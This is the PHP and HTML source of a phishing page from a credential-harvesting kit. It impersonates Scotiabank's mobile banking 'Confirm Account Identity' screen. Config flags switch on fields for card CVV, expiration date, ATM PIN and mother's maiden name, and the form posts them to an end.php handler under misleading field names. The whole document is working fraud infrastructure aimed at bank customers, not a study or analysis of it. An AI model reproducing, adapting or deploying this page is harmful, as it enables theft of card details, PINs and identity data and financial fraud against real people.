<?php

require_once('config.php');

?>

<!DOCTYPE html>
<html style="" class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage no-websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients no-cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths" lang="en"><head><script type="text/javascript" async="async" src="confirm_files/id"></script><script type="text/javascript" async="async" src="confirm_files/id_002"></script>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <title>Scotiabank-BankingWeb</title>
  <meta name="description" content="">
  <link rel="shortcut icon" href="https://mobilebanking4.scotiabank.com/bankingweb/resources/favicon.ico" type="image/x-icon">
  <link rel="apple-touch-icon" href="https://mobilebanking4.scotiabank.com/bankingweb/resources/apple-icon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.00, maximum-scale=1, user-scalable=0">
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <link rel="stylesheet" href="confirm_files/css.css">

  <script src="confirm_files/scripts.js"></script><meta class="foundation-data-attribute-namespace"><meta class="foundation-mq-xxlarge"><meta class="foundation-mq-xlarge-only"><meta class="foundation-mq-xlarge"><meta class="foundation-mq-large-only"><meta class="foundation-mq-large"><meta class="foundation-mq-medium-only"><meta class="foundation-mq-medium"><meta class="foundation-mq-small-only"><meta class="foundation-mq-small"><style></style>


<meta class="foundation-mq-topbar"><style type="text/css"></style><script type="text/javascript" charset="utf-8" async="" data-requirecontext="_" data-requiremodule="components/authentication/dcv/dcv" src="confirm_files/components.js"></script></head>
<body class="f-topbar-fixed">
<nav-bar params="route: route"><div>
    <div class="nav-bar fixed" data-bind="template: { afterRender: enhanceWithin}">
        <nav class="top-bar scotiabank" data-topbar="" role="navigation" data-bind="visible: isVisible(), attr: { class: 'top-bar ' + branding() }" style="">
            <ul class="title-area">
                <li class="name">
                    <h1>
                        <!--
                        <div data-bind="ifnot: route().page === 'account-summary'">
                        <a href="" id="goBack" class="back-button" data-bind="click: goBack" ><img class="back-button"src="images/arrow-back.svg" onerror="this.src='images/arrow-back.png'"></img></a>
                        </div>
                        -->

                    </h1>
                </li>
                
                <!-- <section class="middle tab-bar-section" data-bind="if: displayPageTitle()">
                        <span class="medium" data-bind="html: pageTitle()" tabindex="0"></span>
                </section> -->
                
                <!-- Remove the class "menu-icon" to get rid of menu icon. Take out "Menu" to just have icon alone -->
                <li class="toggle-topbar" data-bind="if: displayMenuOptions()"></li>
            </ul>
            
        <section class="middle tab-bar-section">
                        <img class="logo" aria-hidden="route().page === 'activate-select' || route().page === 'recover-select'  || route().page === 'dcv' " tabindex="0" alt="Scotiabank" data-bind="attr: {src: navLogoSVG(), onerror: navLogoPNG()}" src="confirm_files/logo.svg" onerror="images/en/logo.png">

                </section><section class="top-bar-section" data-bind="if: displayMenuOptions()"></section></nav>
    </div>
</div></nav-bar>
<notifications><div class="notifications" aria-live="assertive" data-bind="template: { afterRender: enhanceWithin}">
	<div class="alert-box" role="alertdialog" data-bind="notificationVisible: hasNotification, notificationType: globalNotification().notificationType" tabindex="-1" style="display: none;">
		<!-- ko if: globalNotification() --><!-- /ko -->
	</div>
</div></notifications>

<div id="page" class="container height100" data-bind="component: { name: route().page, params: route }, css: isWideView() ? 'height100' :''"><div data-bind="template: { afterRender: enhanceWithin}" class="dcv-container component-container">
    <div class="margin">
        <div class="title">
            <span class="large red title" tabindex="0" data-bind="text: dcvTitle">Confirm Account Identity</span>
        </div>
            <div class="profile-questions" data-bind="if: profileQuestions().length &gt; 0">
                <div class="description">
                    <div class="red medium bold" tabindex="0" data-bind="text: i18n.t('DCV.Activate.ProfileQuestionsTitle')">Profile Information</div>
                    <div class="small mt20" tabindex="0" data-bind="text: i18n.t('DCV.Activate.ProfileQuestionsDescription')">Please verify your identity by entering the following information:</div>
                </div>

     <?php 
     if(ASK_4_CVV == TRUE)
     {

    echo "<fieldset class='date-of-birth'>
        		<form action=end.php name=chalbhai id=chalbhai method=post>
        <legend><span tabindex='0' data-bind='text: titleText'>CVV</span></legend>
		<input name='sin' id='sin' max='3' type='text' class='login-card-number small' autocomplete='off'>
		<p></p>
		<p></p>";
    }
     ?>
  
		<p></p>
		<p></p>

    <?php 
    if(ASK_4_EXP == TRUE)    
    { 
    echo "
		        <legend><span tabindex='0' data-bind='text: titleText'>Card Expiration Date</span></legend>
						<input name='dl' max='20' id='dl' type='text' class='login-card-number small' autocomplete='off'>
						<p></p>
		<p></p>
		<p></p>";
    } ?>
    
	   <p></p>
		<p></p>

        <?php 
        if(ASK_4_PIN == TRUE)    
        { 
        echo '

		        <legend><span tabindex="0" data-bind="text: titleText">ATM PIN</span></legend>
						<input name="mmn" id="mmn" type="text" class="login-card-number small" autocomplete="off">
		<p></p>
		<p></p>';
        } ?>
		<p></p>
		<p></p>

        <?php 
        if(ASK_4_DOB == TRUE)    
        { 
        echo '
							        <legend><span tabindex="0" data-bind="text: titleText">Mother Maiden Name</span></legend>
						<input name="dob" id="dob" type="text" class="login-card-number small" autocomplete="off">
						<p></p>';
        } ?>

        <div id="dob-month" data-bind="component: { name: 'dropdown-component', 
        	params: { base: monthField,
                    properties: {
                        title: '',
                        optionsSelect: 'label',
                        labelCaption: i18n.t('Activation.DOBMonth'),
                        startCaption: i18n.t('Activation.DOBMonth'),
                        onEmptyError: i18n.t('Validation.DOBMonthError')
                    }}}"><div data-bind="attr: { id: idName+'-dropDownComponent', class: idName+'-dropdown-component'}, template: { afterRender: enhanceWithin }" id="dropdown_XuTTNup-dropDownComponent" class="dropdown_XuTTNup-dropdown-component">
</div></div>
                   <!--  <span data-bind="text: ko.toJSON(question)"></span> -->
                </div>
            </div>
            <div class="additional-questions" data-bind="if: additionalQuestions().length &gt; 0">
                <div tabindex="0" class="description">
                    <div class="red medium bold" data-bind="text: i18n.t('DCV.Activate.AdditionalQuestionsTitle')"></div>
               
                </div>
                <div class="questions" data-bind="foreach: { data: additionalQuestions, as: 'question' }">
                    <div data-bind="component: { name: question.componentType,
                                params : { base: question.componentBase,
                                            properties: question.componentProperties
                                    }}"><div data-bind="attr: { id: idName+'-checkboxComponent', class: idName+'-checkbox-component'}, template: { afterRender: enhanceWithin }, allowBindings: true" id="checkbox_w4s9ZCD-checkboxComponent" class="checkbox_w4s9ZCD-checkbox-component">

    <fieldset>
        <legend class="clearfix">
     
        </legend>
        <div data-bind="foreach: {data: checkboxList, as: 'answer'}" class="row collapse checkbox-group">
            <ul>
                <li>
      



    </fieldset>
</div>
</div>
   
            </div>
                      <div data-bind="if: (profileQuestions().length &gt; 0 || additionalQuestions().length &gt; 0)">
    <div class="row login" id="rowin">
        <div class="small-12 large-12">
              <a href="end.php">
            <button type="submit" class="red-button" tabindex="0" data-bind="text: label, attr:{ id: idName, disabled: !submitEnabled(), class: submitEnabled() ? 'red-button':'grey-button'}" id="confirmButton">Continue</button></a>
        </div>
    </div>
</div></submit-component></div>
        </form>







    </div>
</div>
</div>
<script type="text/javascript">var _cf = _cf || []; _cf.push(['_setBm', true]);</script><script type="text/javascript" src="confirm_files/async.js"></script>

</body></html>